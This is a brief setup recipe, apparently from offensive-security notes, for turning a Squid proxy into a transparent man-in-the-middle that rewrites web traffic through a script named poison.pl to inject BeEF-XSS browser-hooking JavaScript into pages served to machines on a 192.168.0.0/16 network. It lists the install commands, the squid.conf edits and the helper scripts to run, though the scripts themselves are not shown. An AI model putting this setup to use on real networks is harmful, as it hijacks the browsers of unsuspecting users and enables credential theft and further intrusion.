# Squid Proxy Beef-xss JavaScript

	apt-get update
	apt-get dist-upgrade
	apt-get -y install squid3

kate -> Open: /etc/squid3/squid.conf
Edit (Line 588): acl localnet src 192.168.0.0/16
Edit (Line 644): http_access allow localnet
Edit (Line 868): http_port 3128 transparent
Add (Line: *end*): url_rewrite_program /root/poison.pl
Save

	./beefy.sh
	service apache2 restart
	service squid3 restart

